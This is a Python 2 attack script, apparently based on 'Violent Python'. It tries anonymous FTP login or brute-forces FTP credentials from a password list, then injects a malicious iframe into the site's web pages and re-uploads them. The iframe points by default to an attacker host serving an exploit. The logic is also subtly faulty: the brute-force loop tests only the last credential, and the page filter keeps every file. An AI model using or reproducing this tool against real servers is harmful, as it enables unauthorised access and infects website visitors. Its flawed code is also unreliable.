#!/usr/bin/env python2
# written by Moses Arocha
#Created in Python, with the help of TJ O'Connor's book "Violent Python"

# Program attempts to brute force into an FTP server, gain access, or login in as an anonymous user, then will inject malicious code into the default webpage after it has downloaded.

# IMPORTANT: The password list must be formatted liked this " username:password "
import ftplib
import optparse
import time


def Anonymous(hostname):
    try:
        ftp = ftplib.FTP(hostname)
	ftp.login('anonymous', 'me@yourdomain.com')		
	print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
	ftp.quit()							
	return True					# True if login is successful, failure if login has failed.
    except Exception, e:
	print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed\n'
	return False					


def BruteForce(hostname, passwdFile):
    OpenFile = open(passwdFile, 'r')					
    for line in OpenFile.readlines():				
        time.sleep(1)							# Mandatory so timeout session isn't reached and crashes.
	UserName = line.split(':')[0]					# If it is on the left side of the ":" it is the UserName.
	Password = line.split(':')[1].strip('\r').strip('\n')		# If it is on the right side of the ":" it is the Password.
	print ' [+] Trying : ' + UserName +'/' + Password
    try:
	ftp = ftplib.FTP(hostname)				
	ftp.login(UserName, Password)
	print '\n [Success] ' + str(hostname) + ' FTP Login Succeeded: ' + UserName + ' : ' + Password
	ftp.quit()
	return (UserName, Password)
    except Exception, e:
	pass
    print '\n [Failure] Could Not Brute Force FTP Credentials'
    return (None, None)						
    

def DefaultPage(ftp):
    try: 	# Will attempt to find the directory contents to find default page.
	dirList = ftp.nlst()					
    except:
        dirList = []						
	print '\n\t[Failure] Could Not List Directory Contents'
	print '\n\t[Continue] Skipping To Next Target'
	return							
    retList = []
    for fileName in dirList:					
	fn = fileName.lower()
	if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
	    print '[+] Found Home Page: ' + fileName
	retList.append(fileName)
    return retList

# Inserts an Iframe into it so that redirects the victims to a malicious site, then reuploads the page to the server.
def Injection(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print ' [Step 1] Downloaded Page: ' + page			
    f.write(redirect)
    f.close()
    print ' [Step 2] Injected Malicious IFrame on: '+ page		
    ftp.storlines('STOR ' + page, open(page + '.tmp'))		# Injecting the malicious IFrame, uploading page
    print ' [Step 3] Uploaded Injected Page: ' + page
	
def WebAttack(username, password, TargetHost, redirect):
    ftp = ftplib.FTP(TargetHost)
    ftp.login(username, password)
    defPages = DefaultPage(ftp)
    for defPage in defPages:
        Injection(ftp, defPage, redirect)


# The main function will grab the users input, attempt to anonymously access, if failed, it will then brute force, after grabbing the username and password.
# It will then login through those credientals, grab the default/home page, insert an iframe, and reupload the malicious code.
def main():
    parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -R <Redirect Page> -F <Password File>")
    parser.add_option('-H', '--Host', dest='TargetHosts', type='string', help='specify target host')
    parser.add_option('-P', '--Password', dest='passwdFile', type='string', help='specify user/password file', default='passwordlist.txt')
    parser.add_option('-R', '--Redirect', dest='redirect', type='string', help='specify a redirection page', default='<iframe src="http://192.168.0.10:80/exploit"></iframe>')
    (options, args) = parser.parse_args()
    TargetHosts = str(options.TargetHosts).split(',') 
    passwdFile = options.passwdFile
    redirect = options.redirect
    if TargetHosts == None or redirect == None:		
        print parser.usage
	exit(0)
    for TargetHost in TargetHosts:				# Required: Username and Password must be set at None for program to continue.
	username = None
	password = None
	if Anonymous(TargetHost) == True:			# Will only print if Boolean from Anonymous is True.
 	    username = 'anonymous'
	    password = 'me@yourdomain.com'
	    print ' [Success] Now Using Anonymous Username and Password'
	    WebAttack(username, password, TargetHost, redirect) 
	elif passwdFile != None:
	    (username, password) = BruteForce(TargetHost, passwdFile)
	if password != None:	
	    print '[+] Using Credientals: ' + username + '/' + password + ' To WebAttack'
	    WebAttack(username, password, TargetHost, redirect)


if __name__ == '__main__':
    main()
